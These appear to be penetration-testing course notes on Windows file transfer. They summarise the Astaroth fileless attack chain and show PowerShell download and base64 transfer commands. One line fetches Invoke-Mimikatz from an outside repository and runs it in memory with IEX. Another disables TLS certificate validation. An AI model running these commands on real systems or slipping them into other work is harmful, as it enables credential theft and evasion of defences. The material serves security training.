# Windows File Transfer Methods

The Windows operating system has evolved over the past few years, and new versions come with different utilities for file transfer operations. Understanding file transfer in Windows can help both attackers and defenders. Attackers can use various file transfer methods to operate and avoid being caught. Defenders can learn how these methods work to monitor and create the corresponding policies to avoid being compromised.

Let's use the Microsoft Astaroth Attack blog post as an example of an advanced persistent threat (APT).

The blog post starts out talking about fileless threats. The term fileless suggests that a threat doesn't come in a file, they use legitimate tools built into a system to execute an attack. This doesn't mean that there's not a file transfer operation. As discussed later in this section, the file is not "present" on the system but runs in memory.

The Astaroth attack generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of the WMIC tool with the "/Format" parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing the Bitsadmin tool.

All the payloads were base64-encoded and decoded using the Certutil tool resulting in a few DLL files. The regsvr32 tool was then used to load one of the decoded DLLs, which decrypted and loaded other files until the final payload, Astaroth, was injected into the Userinit process.

We have access to the machine MS02, and we need to download a file from our Pwnbox machine. Let's see how we can accomplish this using multiple File Download methods.

Depending on the file size we want to transfer, we can use different methods that do not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content. Let's see how we can do this with PowerShell.
An essential step in using this method is to ensure the file you encode and decode is correct. We can use md5sum, a program that calculates and verifies 128-bit MD5 checksums. The MD5 hash functions as a compact digital fingerprint of a file, meaning a file should have the same MD5 hash everywhere. Let's attempt to transfer a sample ssh key. It can be anything else, from our Pwnbox to the Windows target.

- Pwnbox Check SSH Key MD5 Hash: Pwnbox Check SSH Key MD5 Hash
- Pwnbox Encode SSH Key to Base64: cat id_rsa | base64 -w 0;echo

We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("base64")

Most companies allow HTTP and HTTPS outbound traffic through the firewall to allow employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe), or only allow access to a list of whitelisted domains in more restricted networks.
PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP, HTTPS or FTP. The following table describes WebClient methods for downloading data from a resource:

- OpenRead: Returns the data from a resource as a Stream;
- OpenReadAsync: Returns the data from a resource without blocking the calling thread;
- DownloadData: Downloads data from a resource and returns a Byte array;
- DownloadDataAsync: Downloads data from a resource and returns a Byte array without blocking the calling thread;
- DownloadFile: Downloads data from a resource to a local file;
- DownloadFileAsync: Downloads data from a resource to a local file without blocking the calling thread;
- DownloadString: Downloads a String from a resource and returns a String;
- DownloadStringAsync: Downloads a String from a resource without blocking the calling thread.



## File Download

We can specify the class name Net.WebClient and the method DownloadFile with the parameters corresponding to the URL of the target file to download and the output file name.

- (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

- (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

## PowerShell DownloadString - Fileless Method

As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.

- IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

IEX also accepts pipeline input.

- (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX

## PowerShell Invoke-WebRequest

From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.

- Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

## Common Errors with PowerShell

There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter -UseBasicParsing.

Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:

- [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

